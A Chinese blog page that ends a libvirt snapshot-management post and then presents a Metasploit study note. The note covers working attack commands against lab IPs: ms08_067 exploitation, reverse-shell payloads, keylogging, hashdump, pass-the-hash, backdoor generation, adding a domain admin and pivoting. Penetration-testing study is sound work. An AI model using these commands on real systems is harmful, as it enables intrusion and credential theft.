|            |  |            |  |            |  |            |  |            |
| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |
|            |  |            |  |            |  |            |  | (Active)   |
&#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;
                  /                  |             |
                 /                   |             |
                /                    |             |
   commit data /         commit data |             |
              /                      |             |
             /                       | commit data |
            v                        |             |
.------------.&lt;----------------------|-------------&#x27;            .------------.
|            |&lt;----------------------&#x27;                          |            |
| RootBase   |                                                  |  Snap-4    |
|            |&lt;-------------------------------------------------| (Active)   |
&#x27;------------&#x27;                  Backing File                    &#x27;------------&#x27;
</code></pre>
<p>上图演示了case1的blockcommit走向，现在sn4的backing file指向rootbase.</p>
<h3 id="blockpull">blockpull</h3>
<p>blockpull（qemu中也称作&#x27;block stream&#x27;）可以将backing合并至active，与blockcommit正好相反.截止目前只能将backing file合并至当前使用的active中，也就是说还不支持指定top的合并.
设想一个下面的场景:</p>
<p>Figure-5</p>
<pre><code>.------------.  .------------.  .------------.  .------------.  .------------.
|            |  |            |  |            |  |            |  |            |
| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |
|            |  |            |  |            |  |            |  | (Active)   |
&#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;
                         |                 |              \
                         |                 |               \
                         |                 |                \
                         |                 |                 \ stream data
                         |                 | stream data      \
                         | stream data     |                   \
                         |                 |                    v
     .------------.      |                 &#x27;---------------&gt;  .------------.
     |            |      &#x27;---------------------------------&gt;  |            |
     | RootBase   |                                           |  Snap-4    |
     |            | &lt;---------------------------------------- | (Active)   |
     &#x27;------------&#x27;                 Backing File              &#x27;------------&#x27;
</code></pre>
<p>使用blockpull我们可以将snap-1/2/3中的数据合并至active层，最终rootbase将变成active的直接后端.</p>
<p>命令如下:</p>
<p>假设快照已经使用 创建Snapshots 小节中的方式完成:</p>
<p>如<em>Figure-5</em>中描述的-- <code>[RootBase] &lt;- [Active]</code>.</p>
<pre><code># virsh blockpull --domain RootBase  \
  --path /var/lib/libvirt/images/active.qcow2  \
  --base /var/lib/libvirt/images/RootBase.qcow2  \
  --wait --verbose
</code></pre>
<p>后续的工作是我们需要使用virsh来清理掉不用的快照</p>
<pre><code># virsh snapshot-delete --domain RootBase Snap-3 --metadata
# virsh snapshot-delete --domain RootBase Snap-2 --metadata
# virsh snapshot-delete --domain RootBase Snap-1 --metadata
</code></pre>
<p>Figure-6</p>
<pre><code>.------------.  .------------.  .------------.  .------------.  .------------.
|            |  |            |  |            |  |            |  |            |
| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |
|            |  |            |  |            |  |            |  | (Active)   |
&#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;
      |                  |              |                  \
      |                  |              |                   \
      |                  |              |                    \  stream data
      |                  |              | stream data         \
      |                  |              |                      \
      |                  | stream data  |                       \
      |  stream data     |              &#x27;------------------&gt;     v
      |                  |                                    .--------------.
      |                  &#x27;---------------------------------&gt;  |              |
      |                                                       |  Snap-4      |
      &#x27;----------------------------------------------------&gt;  | (Active)     |
                                                              &#x27;--------------&#x27;
                                                                &#x27;Standalone&#x27;
                                                                (w/o backing
                                                                file)
</code></pre>
<p>上图表示的是将所有backing file全部合并至active</p>
<p>如下执行命令:</p>
<p>(1) 在我们执行合并 <em>之前</em> 查看一下快照的大小(注意观察&#x27;Active&#x27;):
::</p>
<pre><code>        # ls -lash /var/lib/libvirt/images/RootBase.img
        608M -rw-r--r--. 1 qemu qemu 1.0G Oct 11 17:54 /var/lib/libvirt/images/RootBase.img

        # ls -lash /var/lib/libvirt/images/*Snap*
        840K -rw-------. 1 qemu qemu 896K Oct 11 17:56 /var/lib/libvirt/images/Snap-1.qcow2
        392K -rw-------. 1 qemu qemu 448K Oct 11 17:56 /var/lib/libvirt/images/Snap-2.qcow2
        456K -rw-------. 1 qemu qemu 512K Oct 11 17:56 /var/lib/libvirt/images/Snap-3.qcow2
        2.9M -rw-------. 1 qemu qemu 3.0M Oct 11 18:10 /var/lib/libvirt/images/Active.qcow2
</code></pre>
<p>(2) 单独检查下 &#x27;Active&#x27; 所指向的backing file ::</p>
<pre><code>        # qemu-img info /var/lib/libvirt/images/Active.qcow2
        image: /var/lib/libvirt/images/Active.qcow2
        file format: qcow2
        virtual size: 1.0G (1073741824 bytes)
        disk size: 2.9M
        cluster_size: 65536
        backing file: /var/lib/libvirt/images/Snap-3.qcow2
</code></pre>
<p>(3) 开始 <strong>blockpull</strong> 操作.
::</p>
<pre><code>        # virsh blockpull --domain ptest2-base --path /var/lib/libvirt/images/Active.qcow2 --wait --verbose
        Block Pull: [100 %]
        Pull complete
</code></pre>
<p>(4) 再检查下快照大小， &#x27;Active&#x27;变得很大
::</p>
<pre><code>        # ls -lash /var/lib/libvirt/images/*Snap*
         840K -rw-------. 1 qemu qemu 896K Oct 11 17:56 /var/lib/libvirt/images/Snap-1.qcow2
         392K -rw-------. 1 qemu qemu 448K Oct 11 17:56 /var/lib/libvirt/images/Snap-2.qcow2
         456K -rw-------. 1 qemu qemu 512K Oct 11 17:56 /var/lib/libvirt/images/Snap-3.qcow2
        1011M -rw-------. 1 qemu qemu 3.0M Oct 11 18:29 /var/lib/libvirt/images/Active.qcow2
</code></pre>
<p>(5) 检查&#x27;Active&#x27;信息，现在它已经不需要backing file了，正如<em>Figure-6</em>所示::</p>
<pre><code>        # qemu-img info /var/lib/libvirt/images/Active.qcow2
        image: /var/lib/libvirt/images/Active.qcow2
        file format: qcow2
        virtual size: 1.0G (1073741824 bytes)
        disk size: 1.0G
        cluster_size: 65536
</code></pre>
<p>(6) 清理现场
::</p>
<pre><code>        # virsh snapshot-delete --domain RootBase Snap-3 --metadata
</code></pre>
<p>(7) 现在还可以使用下 guestfish  <strong>READ-ONLY</strong>  模式来检查下磁盘内容( <em>--ro</em> 选项)
::</p>
<pre><code>        # guestfish --ro -i -a /var/lib/libvirt/images/Active.qcow2
</code></pre>
<p>快照删除 (and &#x27;offline commit&#x27;)</p>
<p>删除（live/offline）状态的<em>内置快照</em>很方便 ::</p>
<pre><code># virsh snapshot-delete --domain f17vm --snapshotname snap6
</code></pre>
<p>[OR]</p>
<pre><code># virsh snapshot-delete f17vm snap6
</code></pre>
<p>libvirt现在还没有删除外置快照的功能，但是可以使用<em>qemu-img</em>命令来完成.</p>
<p>比如我们有这样一条链(VM<em>offline</em>状态): <code>base &lt;- sn1 &lt;- sn2 &lt;- sn3</code></p>
<p>现在删除第二个快照(sn2).有两种方式:</p>
<pre><code>* Method (1): base &lt;- sn1 &lt;- sn3 (by copying sn2 into sn1)
* Method (2): base &lt;- sn1 &lt;- sn3 (by copying sn2 into sn3)
</code></pre>
<p>Method (1)</p>
<p>(by copying sn2 into sn1)</p>
<p>注意: 必须保证sn1没有被其他快照作为后端,不然就挂了!!</p>
<p>offline commit</p>
<pre><code># qemu-img commit sn2.qcow2
</code></pre>
<p>将会<em>commit</em>所有在sn2中的改动到sn2的backing file(sn1).
qemu-img commit和virsh blockcommit类似
现在把sn3的后端指向到sn1.</p>
<pre><code># qemu-img rebase -u -b sn1.qcow2 sn3.qcow2
</code></pre>
<p>注意: -u代表&#x27;Unsafe mode&#x27; -- 此模式下仅仅修改了指向到的backing file名字，必须谨慎操作.
现在可以直接删除sn2</p>
<pre><code># rm sn2.qcow2
</code></pre>
<p>Method (2)</p>
<p>(by copying sn2 into sn3)</p>
<p>合并数据，rebase后端:</p>
<pre><code># qemu-img rebase -b sn1.qcow2 sn3.qcow2
</code></pre>
<p>未使用-u模式的rebase将把数据也一并合并过去，即sn2的数据写入到sn3.
换言之: 这里使用的&#x27;Safe mode&#x27;,也是默认模式 --对sn3而言任何从
qemu-img rebase(没有-u)和和virsh blockpull类似.
backingfile（sn1）到旧的backingfile（sn2）之间发生的差异改动都将被合并到sn3中.</p>
<p>现在可以删除sn2了</p>
<pre><code># rm sn2.qcow2
</code></pre></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/libvirt">libvirt</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/kvm">kvm</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/snapshot">snapshot</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="msf study note"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2012/11/12/msf-study-note">metasploit学习笔记</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2012-11-12T00:00:00.000Z" itemprop="datePublished">2012年11月12日</time> · <!-- -->阅读需 44 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote>
<p>N年前使用metasploit框架过程中写下的学习笔记</p>
</blockquote>
<h2 id="一名词解释">一．名词解释</h2>
<ul>
<li>
<p>exploit: 测试者利用它来攻击一个系统，程序，或服务，以获得开发者意料之外的结果。常见的 有内存溢出，网站程序漏洞利用，配置错误exploit。</p>
</li>
<li>
<p>payload: 我们想让被攻击系统执行的程序，如reverse shell可以从目标机器与测试者之间建立一 个反响连接，bind shell 绑定一 个执行命令的通道至测试者的机器。payload也可以是只 能在目标机器上执行有限命令的程序。</p>
</li>
<li>
<p>shellcode: 是进行攻击时的一系列被当作payload的指令，通常在目标机器上执行之后提供一个可 执行命令的shell。</p>
</li>
<li>
<p>module: MSF的模块，由一系列代码组成。</p>
</li>
<li>
<p>listener: 等待来自被攻击机器的incoming连接的监听在测试者机器上的程序。</p>
</li>
</ul>
<h2 id="二msf基础">二．MSF基础</h2>
<h3 id="启动msf">启动msf</h3>
<p>1、MSF提供多种用户界面：控制台模式（msfconsole），命令行模式（msfcli），图形模式（msfgui、armitage），（在老版本中还有web界面模式，后来貌似由于安全因素被取消了？）其中console模式最常用，启动方式：</p>
<pre><code>cd /opt/framework/msf3/
msfconsole
</code></pre>
<p>运行此命令后将进入msf命令提示符：</p>
<pre><code>msf&gt;
</code></pre>
<h3 id="获取帮助信息">获取帮助信息</h3>
<p>2、获取命令的帮助信息：help</p>
<p>例子：</p>
<pre><code>help connect
</code></pre>
<h3 id="msfcli">msfcli</h3>
<p>3、msfcli 和msfconsole相比不提供交互方式，它直接从命令行输入所有参数并产生结果，</p>
<pre><code>msfcli –h #获取帮助信息
msfcli &lt;exploit_name&gt; &lt;option=value&gt; [mode]
</code></pre>
<pre><code>mode:H（help）帮助

   S（summary）显示模块信息

    O（options）显示模块的可用选项

     A（advanced）显示高级选项   

I（ids）显示IDS EVASION 选项

     P（payload）显示此模块可用的payload

T（targets）显示可用targets

AC（action）显示可用actions

C（check）运行模块测试

   E（execute）执行选定的模块
</code></pre>
<h3 id="模块使用示例">模块使用示例</h3>
<p>例子：ms08_067_netapi模块</p>
<pre><code>msfcli windows/smb/ms08_067_netapi O    #查看可用选项
msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 P #查看可用payload
msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 PAYLOAD=windows/shell/bind_tcp E   #执行 （此处O、P 等参数也可以用小写）
</code></pre>
<h3 id="armitage使用">armitage使用</h3>
<p>4、Armitage <!-- -->:MSF<!-- -->的一个图形接口</p>
<p>运行方式：</p>
<pre><code>cd /opt/farmework/msf3/
armitage
</code></pre>
<h3 id="msf其他组件">msf其他组件</h3>
<p>5、MSF其他组件：</p>
<ul>
<li>MSFpayload工具：</li>
</ul>
<p>用于生成shellcode，可生成C,Ruby，JaveScript，VB格式的shellcode。
帮助信息：</p>
<pre><code>msfpayload –h
</code></pre>
<ul>
<li>MSFencode工具：</li>
</ul>
<p>编码压缩shellcode，过IDS ,防火墙。</p>
<pre><code>msfencode -h
msfencode –l 查看可用的编码器（encoders），效果最佳的是x86/shikata_ga_nai
</code></pre>
<h2 id="三信息刺探与收集">三．信息刺探与收集</h2>
<h3 id="1攻击第一步基础信息收集">1、攻击第一步：基础信息收集</h3>
<p>whois查询：</p>
<pre><code>msf &gt; whois example.com
msf&gt; whois 192.168.1.100
</code></pre>
<p><a href="http://searchdns.netcraft.com/%E5%9C%A8%E7%BA%BF%E6%94%B6%E9%9B%86%E6%9C%8D%E5%8A%A1%E5%99%A8IP%E4%BF%A1%E6%81%AF%E5%B7%A5%E5%85%B7">http://searchdns.netcraft.com/在线收集服务器IP信息工具</a></p>
<pre><code>nslookup
set type=mx
&gt; example.com
</code></pre>
<h3 id="2用nmap探测开放端口和服务">2、用nmap探测开放端口和服务：</h3>
<p>-sS SYN半开扫描  -sT TCP 半开扫描 -Pn 不使用ping 方式探测主机  -A 探测服务类型 -6 开启IPV6扫描  -O 探测操作系统版本
常用扫描参数组合：</p>
<pre><code>nmap –sS –Pn 192.168.0.111
nmap –sS –Pn –A 192.168.0.111 
</code></pre>
<p>其他组合：</p>
<pre><code>nmap -T4 -A -v 深入式扫描
nmap -sS -sU -T4 -A -v 同上，且扫UDP
nmap -p 1-65535 -T4 -A -v  扫描所有TCP端口
nmap -T4 -A -v -Pn 不使用ping
nmap -sn 使用ping
nmap -T4 -F 快速扫描
nmap -sV -T4 -O -F --version-light 加强版快速扫描
nmap -sn --traceroute 快速路由跟踪扫描
nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; 慢速全面扫描
</code></pre>
<p>（nmap的scripts位于/usr/local/share/nmap/scripts/目录，用LUA语言编写，nmap --script-help all | less 查看脚本扫描帮助信息）
（nmap还有一个GUI界面工具叫zenmap，命令zenmap或nmapfe都可以启动）</p>
<h3 id="3msf与postgresql协同工作">3、MSF与postgresql协同工作</h3>
<pre><code>/etc/init.d/postgreql-8.3 start
msf&gt; db_connect postgres:toor@127.0.0.1/msf
msf&gt; db_status
# 导入nmap扫描的结果：
nmap –sS –Pn –A –oX Subnet1 192.168.1.0/24   # -oX 扫描结果导出为Subnet1.xml
msf&gt; db_import Subnet1.xml
msf&gt; db_hosts –c address   #查看导入的主机IP 
</code></pre>
<p>msf也可以和mysql一起工作，在bt5 r1中msf默认支持连接mysql：</p>
<pre><code>msf&gt; db_driver mysql
msf&gt; db_connect root:toor@127.0.0.1/msf3 #连接本机mysql的msf3数据库
mysql默认密码toor，使用db_connect连接时会自动创建msf3库）
</code></pre>
<h3 id="4高级扫描方式">4、高级扫描方式：</h3>
<pre><code>msf&gt; use auxiliary/scanner/ip/ipidseq   #IPID序列扫描器，与nmap的-sI -O选项类似
show options
set RHOSTS 192.168.1.0/24
set RPORT 8080
set THREADS 50
run
</code></pre>
<p>（RHOSTS、RPORT等参数也可以用小写）</p>
<pre><code>msf&gt; nmap –PN –sI 192.168.1.09 192.168.1.155
</code></pre>
<p>nmap 连接数据库：</p>
<pre><code>msf&gt; db_connect postgres:toor@127.0.0.1/msf
msf&gt; db_nmap –sS –A 192.168.1.111
msf&gt; db_services  #查看扫描结果
</code></pre>
<p>使用portscan模块：</p>
<pre><code>msf&gt; search postscan
msf&gt; use scanner/postscan/syn
set RHOSTS 192.168.1.111
set THREADS 50
run
</code></pre>
<h3 id="5特定扫描">5、特定扫描：</h3>
<p>smb_version模块：</p>
<pre><code>msf&gt; use auxiliary/scanner/smb/smb_version
show options
set RHOSTS 192.168.1.111
run
db_hosts –c address,os_flavor
</code></pre>
<p>查找mssql主机：</p>
<pre><code>msf&gt; use auxiliary/scanner/mssql/mssql_ping
show options
set RHOSTS 192.168.1.0/24
set THREADS 255
run
</code></pre>
<p>SSH服务器扫描：</p>
<pre><code>msf&gt; use auxiliary/scanner/ssh/ssh_version 
set THREADS 50
run
</code></pre>
<p>FTP主机扫描：</p>
<pre><code>msf&gt; use auxiliary/scanner/ftp/ftp_version 
show options
set RHOSTS 192.168.1.0/24
set THREADS 255
run
</code></pre>
<p>扫描FTP匿名登录：</p>
<pre><code>use auxiliary/scanner/ftp/anonymos
set RHOSTS 192.168.1.0/24
set THREADS 50
run
</code></pre>
<p>扫描SNMP主机：</p>
<pre><code>msf&gt; use auxiliary/scanner/snmp/snmp_login
set RHOSTS 192.168.1.0/24
set THREADS 50
run
</code></pre>
<h3 id="6编写自定义扫描模块">6、编写自定义扫描模块：</h3>
<p>MSF框架提供对其所有exploit和method的访问，支持代理，SSL，报告生成，线程， 使用Ruby语言。</p>
<p>例子：一个简单的自定义扫描模块</p>
<pre><code class="language-ruby">#Metasploit
require ‘msf/core’
class Metasploit3 &lt; Msf::Auxiliary
include Msf::Exploit::Remote::Tcp
include Msf:Auxiliary::Scanner
def initialize
super(
    ‘Name’ =&gt; ‘My custom TCP scan’,
    ‘Version’ =&gt; ‘$Revision: 1$’,
    ‘Description’ =&gt; ‘My quick scanner’,
    ‘Author’ =&gt; ‘Your name here’,
    ‘License’ =&gt; ‘MSF_LICENSE’
)

register_options(
    [
    Opt::RPORT(12345)
    ],self.class)

end

def run_host(ip)
    connect()
        sock.puts(‘HELLO SERVER’)
        data = sock.recv(1024)
        print_status(“Received: #{data} from #{ip}”)
        disconnect()
    end
end
</code></pre>
<p>测试：将模块保存到modules/auxiliary/scanner/目录下面,命名为simple_tcp.rb，注意保存的位置很重要。</p>
<p>使用nc监听一个端口测试这个模块：</p>
<pre><code>echo “Hello Metasploit” &gt; banner.txt
nc –lvnp 12345 &lt; banner.txt
</code></pre>
<pre><code>msf&gt; use auxiliary/scanner/simple_tcp
&gt;show options
&gt;set RHOSTS 192.168.1.111
&gt;run
[*] Received: Hello Metasploit from 192.168.1.111
</code></pre>
<h2 id="四基本漏洞扫描">四．基本漏洞扫描</h2>
<h3 id="1-基本扫描">1 基本扫描</h3>
<p>1、使用nc与目标端口通信，获取目标端口的信息：</p>
<pre><code>nc 192.168.1.111 80
GET HTTP 1/1
Server: Microsoft-IIS/5.1
</code></pre>
<p>1: 还有一个功能与nc类似的工具Ncat，产自nmap社区，可实现相同功能：</p>
<pre><code>ncat -C 192.168.1.111 80
GET / HTTP/1.0
</code></pre>
<p>2：题外：ncat还可以做聊天服务器呢！在服务器端监听然后多个客户端直接连上就可以聊天了：服务器（chatserver）：ncatncat -l --chat   其他客户端：ncat chatserver</p>
<p>3：ncat还可以用来查看各种客户端的请求信息，比如论坛里有人问中国菜刀有木有后门，那么可以这样查看中国菜刀连接后门时发送的数据：
服务器（server.example.com）上：<code>ncat -l --keep-open 80 --output caidao.log &gt; /dev/null</code>  然后使用菜刀连接<a href="http://server.example.com/nc.php">http://server.example.com/nc.php</a> 并请求操作，这是菜刀发送的数据就保存到服务器的caidao.log里面了。也可以导出为hex格式，--output换为--hex-dump就可以了。</p>
<p>4：其实与nc功能类似的工具在bt5里面还有很多，比如还有一个sbd：</p>
<p>监听：<code>sbd -l -p 12345</code></p>
<p>连接：<code>sbd 192.168.1.111 12345</code></p>
<p>5：当然也可以用来聊天，与ncat的不同之处在于ncat自动对用户编号user1、user2、...，而sbd可以自定义昵称，且不需要专门单独监听为聊天服务器：</p>
<p>pc1：<code>sbd -l -p 12345 -P chowner</code></p>
<p>pc2：<code>sbd pc1 12345 -P evil</code></p>
<p>6：其实nc也可以用来聊天的：</p>
<p>pc1：<code>nc -l -p 12345</code></p>
<p>pc2: <code>telnet pc1 12345</code></p>
<h3 id="2-与nexpose结合扫描">2 与NeXpose结合扫描：</h3>
<p>在nexpose中扫描目标并生成xml 格式的报告后，将报告导入到msf：</p>
<pre><code>db_connect postgres:toor@127.0.0.1/msf
db_import /tmp/host_test.xml
db_hosts –c address,svvs,vulns
db_vulns
</code></pre>
<p>在MSF中运行nexpose：</p>
<pre><code>db_destroy postgres:toor@127.0.0.l1/msf
db_connect postgres:toor@127.0.0.1/msf
load nexpose
nexpose_connect –h
nexpose_connect nexpose:toor@192.168.1.111 ok
nexpose_scan 192.168.1.195
db_hosts –c address
db_vulns
</code></pre>
<p>（如果你想在bt5里安装nexpose的话建议把bt5硬盘空间多留几十G，这玩意硬盘小了不让装。）</p>
<h3 id="3与nessus结合扫描">3、与nessus结合扫描：</h3>
<p>使用Nessus扫描完成后生成.nessus格式的报告，导入到MSF：</p>
<pre><code>db_connect postgres:toor@127.0.0.1/msf
db_import /tmp/nessus_report_Host_test.nessus
db_hosts –c address,svcs,vulns
db_vulns
</code></pre>
<p>在MSF中使用Nessus：</p>
<pre><code>db_connect postgres:toor@127.0.0.1/msf
load nessus
nessus_connect nessus:toor@192.168.1.111:8834 ok
nessus_policy_list  #查看存在的扫描规则
nessus_scan_new 2 bridge_scan 192.168.1.111 #2表示规则的ID号，bridge_scan自定义扫描名称
nessus_scan_status #查看扫描进行状态
nessus_report_list  #查看扫描结果
nessus_report_get skjla243-3b5d-*******   #导入报告
db_hosts –c address,svcs,vulns
</code></pre>
<h3 id="4特殊扫描">4、特殊扫描：</h3>
<p>SMB弱口令:</p>
<pre><code>msf&gt; use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.111-222
set SMBUser Administrator
set SMBPass admin
run
</code></pre>
<p>VNC空口令：</p>
<pre><code>msf&gt; use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS 192.168.1.111
run
</code></pre>
<p>Open X11空口令：</p>
<pre><code>msf&gt; use auxiliary/scanner/x11/open_x11
set RHOST 192.168.1.0/24
set THREADS 50
run
</code></pre>
<p>当扫描到此漏洞的主机后可以使用xspy工具来监视对方的键盘输入：</p>
<pre><code>cd /pentest/sniffers/xspy/
./xspy –display 192.168.1.125:0 –delay 100
</code></pre>
<h3 id="5使用autopwn处理扫描结果">5、使用Autopwn处理扫描结果：</h3>
<p>autopwn选项：e执行attack   t查看匹配模块   r使用reverse shell作为payload   x基于漏洞筛选模块  p基于端口筛选模块</p>
<pre><code>db_connect postgres:toor@127.0.0.1/msf
db_import /root/nessus.nbe
db_autopwn –e –t –r –x –p
</code></pre>
<ul>
<li>-e 针对符合条件的目标加载所有exploit -t显示所有匹配的exploit -r使用反弹shell</li>
<li>-x 基于漏洞筛选模块 -p基于端口筛选模块</li>
</ul>
<h2 id="五基础溢出命令">五．基础溢出命令</h2>
<h3 id="1基本命令">1、基本命令：</h3>
<p>查看可用溢出模块<code>show exploits</code>
查看辅助模块<code>show auxiliary</code>  包括扫描器，拒绝服务模块，fuzzer工具或其他。
查看可用选项<code>show options</code></p>
<p>加载模块后退出此模块 back</p>
<p>例子：</p>
<pre><code>msf&gt; use windows/smb/ms08_067_netapi
back
</code></pre>
<p>搜索模块 search</p>
<p>例子： <code>searh mssql search ms08_067</code></p>
<p>查看当前模块可用的payload： <code>show payloads</code></p>
<p>例子：</p>
<pre><code>use windows/smb/ms08_067_netapi
show payloads
set payload windows/shell/reverse_tcp
show options
</code></pre>
<p>查看可选的目标类型<code>show targets</code>
查看更多信息<code>info</code>
设置一个选项或取消设置 <code>set/unset</code>
设置或取消全局选项 <code>setg/unsetg</code>  例如设置LHOST就可以用setg，避免后面重复设置
保存全局选项的设置 <code>save</code>   当下次启动仍然生效
查看建立的session  <code>sessions –l</code></p>
<p>激活session   <code>sessions –i  num</code>    #num为session编号</p>
<h3 id="2暴力端口探测">2、暴力端口探测：</h3>
<p>当主机端口对外开放但是普通探测方法无法探测到时，用此模块，msf将对目标的所有端口进行尝试，直到找到一个开放端口并与测试者建立连接。</p>
<p>例子：</p>
<pre><code>use exploit/windows/smb/ms08_067_netapi
set LHOST 192.168.1.111
set RHOST 192.168.1.122
set TARGET 39 #Windows XP SP3 Chinese - Simplified (NX)
search ports   #搜索与ports相关模块
set PAYLOAD windows/meterpreter/reverse_tcp_allports
exploit –j   #作为后台任务运行
sessions –l –v
sesssions –i 1
</code></pre>
<h3 id="3msf脚本文件">3、MSF脚本文件：</h3>
<p>为了缩短测试时间可以将msf命令写入一个文件，然后在msf中加载它。</p>
<p>加载方式：msfconsole的resource命令或者msfconsole加上-r选项</p>
<p>例子：</p>
<pre><code>echo ‘version’ &gt; resource.rc
echo ‘load sounds’ &gt;&gt; resource.rc
msfconsole –r resource.rc
</code></pre>
<p>例子：</p>
<pre><code>echo &#x27;use exploit/windows/smb/ms08_067_netapi&#x27; &gt; autoexp.rc
echo &#x27;set RHOST 192.168.1.133&#x27; &gt;&gt; autoexp.rc
echo &#x27;set PAYLOAD windows/meterpreter/reverse_tcp&#x27; &gt;&gt; autoexp.rc
echo &#x27;set LHOST 192.168.1.111&#x27; &gt;&gt; autoexp.rc
echo &#x27;exploit&#x27; &gt;&gt; autoexp.rc
msfconsole
msf&gt; resource autoexp.rc
</code></pre>
<h2 id="六meterpreter">六．METERPRETER</h2>
<h3 id="1使用meterpreter">1、使用meterpreter</h3>
<p>当对目标系统进行溢出时，使用meterpreter作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。
例子：</p>
<pre><code>msf&gt; nmap –sT –A –P0 192.168.1.130 #探测开放服务
#假如已经探测到1433（TCP）和1434(UDP)端口（mssql），
msf&gt; nmap –sU 192.168.1.130 –P 1434   #确认端口开放
msf&gt; use auxiliary/scanner/mssql/mssql_ping
show options
set RHOSTS 192.168.1.1/24
set THREADS 20
exploit
</code></pre>
<p>至此可获取服务器名称，版本号等信息。</p>
<pre><code>msf&gt; use auxiliary/scanner/mssql/mssql_login
show options
set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt
set RHOSTS 192.168.1.130
set THREADS 10
set verbose false
exploit
</code></pre>
<p>暴力猜解登陆密码。接下来使用mssql自带的xp_cmdshell功能添加账户：</p>
<pre><code>msf&gt; use exploit/windows/mssql/mssql_payload
show options
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.111
set LPORT 433
set RHOST 192.168.1.130
set PASSWORD password130
exploit
</code></pre>
<p>当获取到一个meterpreter shell 后可以执行更多的操作：</p>
<p>获取屏幕截图：<code>screenshot</code></p>
<p>获取系统信息：<code>sysinfo</code></p>
<p>获取键盘记录：</p>
<pre><code>meterpreter&gt; ps  #查看目标机器进程，假设发现explorer.exe的进程号为1668:
meterpreter&gt; migrate 1668  #插入该进程
meterpreter&gt; run post/windows/capture/keylog_recorder  #运行键盘记录模块，将击键记录保存到本地txt
cat /root/.msf3/loot/*****.txt  #查看结果
</code></pre>
<p>获取系统账号密码：</p>
<pre><code>meterpreter&gt; use priv
meterpreter&gt; run post/windows/gather/hashdump
</code></pre>
<p>当获取到密码的hash之后无法破解出明文密码且无法直接使用hash登陆，需要使用pass-the-hash技术：</p>
<pre><code>msf&gt; use windows/smb/psexec
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.111
set LPORT 443
set RHOST 192.168.1.130
set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29
exploit
</code></pre>
<p>获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门：</p>
<p>在目标机器上执行：<code>net uaer hacker pass /add</code></p>
<p>本地生成一个后门程序：</p>
<pre><code>msfpayload windows/meterpreter/reverse_tcp
LHOST=192.168.1.111 LPORT=443 X &gt;payload.exe
</code></pre>
<p>将payload.exe拷贝到目标机器然后使用新建立的账号执行,本地执行端口监听，等待来自目标机器连接：</p>
<pre><code>msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp
LHOST=192.168.1.111 LPORT=443
use priv
getsystem
getuid
</code></pre>
<p>至此取得SYSTEM权限</p>
<h3 id="2令牌模拟">2、令牌模拟：</h3>
<p>当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。</p>
<pre><code>meterpreter&gt; ps  # 查看目标机器进程，找出域控账户运行的进程ID，假如发现PID为380
meterpreter&gt; steal_token 380
#有时ps命令列出的进程中可能不存在域控账户的进程，此时使用incognito模块查看可用token：
meterpreter&gt; use incognito
meterpreter&gt; list_tokens –u  #列出可用token，假如找到域控token
meterpreter&gt; impersonate_token SNEAKS.IN\\ihazdomainadmin
meterpreter&gt; add_user hacker password –h 192.168.1.50 #在域控主机上添加账户
meterpreter&gt; add_group_user “Domain Admins” hacker –h 192.168.1.50  #将账户添加至域管理员组
</code></pre>
<h3 id="3内网渗透">3、内网渗透：</h3>
<p>当取得同网段内一台主机的权限后可以进一步渗透网内其他主机：</p>
<p>例子：</p>
<pre><code>meterpreter&gt; run get_local_subnets  #查看网段/子网
Local subnet: 192.168.33.0/255.255.255.0
meterpreter&gt; background  #转入后台运行
msf&gt; route add 192.168.33.0 255.255.255.0 1  #本地添加路由信息
msf&gt; route print #查看添加的信息
msf&gt; use linux/samba/lsa_transnames_heap   #准备向内网目标主机进攻
set payload linux/x86/shell/reverse_tcp
set LHOST 10.10.1.129 #此处为attacking主机的外网IP 
set LPORT 8080
set RHOST 192.168.33.132 #内网目标主机
exploit
</code></pre>
<p>也可以使用自动式添加路由模块：</p>
<pre><code>msf&gt; load auto_add_route
msf&gt; exploit
</code></pre>
<h3 id="4meterpreter脚本">4、Meterpreter脚本：</h3>
<p>使用run scriptname 方式执行</p>
<p>vnc脚本,获取远程机器vnc界面控制</p>
<pre><code>meterpreter&gt; run vnc
meterpreter&gt; run screen_unlock
</code></pre>
<p>进程迁移</p>
<p>当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。</p>
<p>例子：</p>
<pre><code>meterpreter&gt; run post/windows/manage/migrate
</code></pre>
